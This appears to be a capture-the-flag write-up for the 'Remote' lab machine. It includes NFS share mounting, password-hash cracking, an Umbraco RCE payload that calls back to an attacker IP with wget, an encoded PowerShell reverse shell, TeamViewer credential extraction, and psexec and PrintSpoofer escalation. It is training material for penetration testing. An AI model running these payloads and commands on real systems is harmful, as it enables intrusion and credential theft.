@@ -1,0 +1,205 @@
+                     Remote
+
+                                                                                1st September 2020 / Document No D20.100.85
+                                                                                Prepared By: MrR3boot
+                                                                                Machine Author(s): mrb3n
+                                                                                Difficulty: Easy
+                                                                                Classification: Official
+
+                                 Synopsis
+
+Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are
+found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to
+gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This
+password has been reused with the local administrator account. Using psexec with these credentials
+returns a SYSTEM shell.
+
+Skills Required
+
+      Enumeration
+
+Skills Learned
+
+      NFS Enumeration
+      CMS Exploitation
+      TeamViewer Credential Gathering
+      SeImpersonate Privilege Abuse
+
+Enumeration
+Enumeration
+
+Nmap
+
+   nmap -A -p- --min-rate=1000 -T4 10.10.10.180
+
+Nmap reveals that the target host is a Windows system that features a web server, FTP, SMB and NFS
+services running on their default ports. It is also revealed that the FTP service permits anonymous access.
+
+FTP
+
+Let's login to FTP with the credentials anonymous / anonymous .
+There are no files present. We can ignore this service for now.
+
+IIS
+
+Browsing to port 80 reveals a web store.
+
+Intranet page sounds interesting, but it doesn't contain much. Let's enumerate other files and directories
+that could be hosted on the server using Gobuster.
+
+Gobuster
+Gobuster
+
+   gobuster dir --url=http://10.10.10.180/ --wordlist=/usr/share/wordlists/dirb/common.txt
+
+Gobuster output reveals an umbraco folder. Let's browse to that.
+
+The logo and page title reveals that the application is an Umbraco CMS instance. Attempts with common
+default credentials such as admin / admin , admin / test , administrator / password , admin /
+password and root / password failed.
+
+NFS
+NFS
+
+Available shares on Network File System can be enumerated using showmount utility. Let's install it by
+issuing the command below.
+
+   sudo apt install nfs-common
+We can now enumerate directories that are exported on NFS.
+
+   showmount -e 10.10.10.180
+
+The site_backups folder is accessible to everyone. Let's mount this folder on our machine.
+   mkdir backups
+   sudo mount -t nfs 10.10.10.180:/site_backups backups/
+
+Listing this reveals an Umbraco subdirectory.
+Reading about Umbraco credential files online reveals that credentials are stored in the file Umbraco.sdf
+within the App_Data folder. Let's check for admin user credentials in this file.
+
+   strings App_Data/Umbraco.sdf | grep admin
+This reveals the username admin@htb.local and a SHA1 password hash. This can be cracked using John
+The Ripper.
+
+   echo -n 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > hash
+   john hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
+
+Foothold
+
+We can login to Umbraco CMS with the admin@htb.local / baconandcheese credentials.
+
+Clicking the Help icon in the bottom-left reveals that the version of the CMS is 7.12.4 .
+This version suffers from an authenticated remote code execution vulnerability, for which a public exploit is
+available. Download the exploit and modify the login details as below.
+
+   ...
+   login = "admin@htb.local";
+   password="baconandcheese";
+   host = "http://10.10.10.180";
+   ...
+
+In order to validate the vulnerability, we can change the payload to issue a web request to our server using
+wget 10.10.14.7/rce (changing this to your tun0 IP address). We can use iwr , wget and curl as aliases
+for the PowerShell command Invoke-WebRequest .
+
+   ...
+   payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
+   xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-
+   com:xslt" \
+   xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
+   <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+   { string cmd = "wget 10.10.14.7/rce"; System.Diagnostics.Process proc = new
+   System.Diagnostics.Process();\
+
+     proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
+     proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;
+   \
+     proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+     </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+     </xsl:template> </xsl:stylesheet> ';
+   ...
+
+Next, stand up a listener on port 80 and run the exploit.
+We receive a hit our our server, which confirms that the CMS is vulnerable. Using Metasploit's
+web_delivery module, we can create a PowerShell payload that can be used to obtain a reverse shell.
+
+   msfconsole
+   use exploit/multi/script/web_delivery
+   set RHOSTS <ip>
+   set payload windows/x64/meterpreter/reverse_tcp
+   set LHOST tun0
+   set target 2
+   run
+
+Let's modify the payload in the script.
+   ...
+   payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
+   xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-
+   com:xslt" \
+   xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
+   <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+   { string cmd = "-nop -w hidden -e
+   WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGk
+   AdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGU<SNIP>"; System.Diagnostics.Process
+   proc = new System.Diagnostics.Process();\
+
+     proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
+     proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;
+   \
+     proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+     </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+     </xsl:template> </xsl:stylesheet> ';
+   ...
+Upon running the exploit, we receive a shell.
+
+We can interact with the session using the command sessions -i 1 . This reveals that we are in the
+execution context of the IIS application pool identity apppool\defaultapppool .
+The user flag can be found in the C:\Users\Public folder.
+
+Privilege Escalation
+
+Having gained a foothold, we can now enumerate the host. Checking for running services reveals the
+TeamViewer service.
+
+The service description reports that this is TeamViewer 7. We can confirm this using PowerShell.
+   powershell.exe
+   (Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe").Version
+This confirms that TeamViewer 7 is installed, which is known to be vulnerable to CVE-2019-18988.
+TeamViewer versions 7.0.43148 through to 14.7.1965 (with TeamViewer 14 the
+SecurityPasswordExported key must be available). In vulnerable versions, AES-128-CBC encrypted user
+passwords are stored in the Windows registry using the known key 0602000000a400005253413100040000
+and the iv 0100010067244F436E6762F25EA8D704 .
+Let's background the session and use the Metasploit teamViewer_passwords module to gather the
+credentials.
+
+   meterpreter > bg
+   use post/windows/gather/credentials/teamviewer_passwords
+   set SESSION 1
+   run
+
+The module output reveals the password !R3m0te! . The TeamViewer password by itself doesn't provide us
+with elevated access. However, it is possible that the password could have been reused with a privileged
+account such as the local administrator.
+As the SMB service is running, we can attempt to obtain SYSTEM access using Metasploit's psexec module.
+   use exploit/windows/smb/psexec
+   set RHOSTS 10.10.10.180
+   set SMBPass !R3m0te!
+   set SMBUser administrator
+   set LHOST tun0
+   run
+
+This is successful, and we can access the root.txt on the administrator Desktop.
+
+Alternate Method
+
+Let's check the privileges of iis apppool\defaultapppool user.
+The output shows that this user has the SeImpersonatePrivilege set. Let's check the operating system
+version.
+
+The host is running the Windows Server 2019 operating system. Using the PrintSpoofer exploit,
+impersonation privileges can be abused to gain SYSTEM access on the server. We can build the project using
+Visual Studio. Double-click the solution file ( PrintSpoofer.sln ) to open it, click "Build" from the menu, and
+then "Build Solution".
+Next, upload the generated PrintSpoofer.exe binary to the host.
+We can now run the exploit to obtain SYSTEM shell.
+
